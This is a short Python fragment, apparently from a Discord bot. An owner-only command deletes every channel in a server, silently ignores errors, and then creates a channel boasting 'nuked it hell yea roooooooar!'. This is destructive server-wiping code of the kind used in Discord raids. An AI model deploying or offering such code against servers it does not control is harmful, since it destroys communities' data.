  if message.author.id == owner:
    for msg in ctx.guild.channels:
      try:
        await msg.delete()
      except:
        pass
    await ctx.guild.create_text_channel("nuked it hell yea roooooooar!  ")
  else:
    await ctx.send ("ask salty bear") 